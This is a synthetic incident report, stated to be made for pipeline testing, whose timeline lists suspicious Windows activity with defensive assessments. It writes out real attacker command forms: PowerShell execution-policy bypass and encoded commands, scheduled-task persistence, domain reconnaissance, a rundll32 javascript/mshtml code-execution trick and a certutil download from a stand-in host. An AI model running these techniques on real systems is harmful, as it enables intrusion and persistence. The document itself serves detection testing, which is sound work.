EXECUTIVE SUMMARY
============================================================

On January 15, 2024, the Security Operations Center (SOC) detected
suspicious activity on multiple workstations within the EXAMPLE.CORP
domain. The activity involved unusual PowerShell execution, scheduled
task creation, and potential reconnaissance commands.

This is a SYNTHETIC incident report created for pipeline testing.
No real systems were compromised.

============================================================
TIMELINE OF EVENTS
============================================================

08:23:14 UTC — PowerShell process started on WORKSTATION-01
  User: DOMAIN\analyst
  Command: powershell.exe -ExecutionPolicy Bypass -File collect_logs.ps1
  Assessment: PowerShell was executed with -ExecutionPolicy Bypass flag,
  which disables script execution restrictions. While this can be used
  for legitimate administration, it is also commonly used by attackers
  to run malicious scripts.

08:25:01 UTC — cmd.exe spawned by PowerShell on WORKSTATION-01
  User: DOMAIN\analyst
  Command: cmd.exe /c whoami
  Assessment: The whoami command was executed to determine the current
  user context. This is a common reconnaissance technique.

08:30:45 UTC — Outbound network connection from PowerShell on WORKSTATION-01
  Destination: internal-logs.example.corp:443
  Protocol: TCP/HTTPS
  Assessment: PowerShell made an outbound connection to an internal server.
  This could be legitimate log collection or data exfiltration.

09:10:22 UTC — Scheduled task created on WORKSTATION-02
  User: DOMAIN\admin
  Command: schtasks /create /tn TestTask /tr test_script.bat /sc daily
  Assessment: A daily scheduled task was created. This is a common
  persistence mechanism used by attackers to maintain access.

10:05:17 UTC — Domain user enumeration on SERVER-DC01
  User: DOMAIN\svc_account
  Command: net user testuser /domain
  Assessment: Domain user information was queried from the domain
  controller. This is a reconnaissance technique for gathering
  information about domain accounts.

10:45:08 UTC — Encoded PowerShell command on WORKSTATION-03
  User: DOMAIN\user1
  Command: powershell.exe -EncodedCommand ZQBjAGgAbwAgAHQAZQBzAHQA
  Decoded: echo test
  Assessment: An encoded PowerShell command was executed. Encoding is
  frequently used to obfuscate malicious commands and evade detection.

11:20:55 UTC — Domain controller enumeration on SERVER-DC01
  User: DOMAIN\svc_account
  Command: nltest /dclist:example.corp
  Assessment: The nltest command was used to list domain controllers.
  This is a discovery technique used to map the Active Directory
  infrastructure.

11:30:10 UTC — Suspicious outbound connection from WORKSTATION-03
  Destination: test-c2-simulation.example.test:8080
  Protocol: TCP
  Assessment: PowerShell initiated a connection to an external host
  on port 8080. This pattern is consistent with command-and-control
  (C2) communication.

14:00:05 UTC — Suspicious rundll32 execution on WORKSTATION-01
  User: DOMAIN\analyst
  Command: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication"
  Assessment: This rundll32 usage pattern is a known technique for
  executing arbitrary code through the Windows HTML engine.

15:30:00 UTC — Certutil download on WORKSTATION-02
  User: DOMAIN\admin
  Command: certutil -urlcache -split -f http://example.test/testfile.txt
  Assessment: Certutil was used to download a file from the internet.
  This is a known living-off-the-land binary (LOLBin) technique.
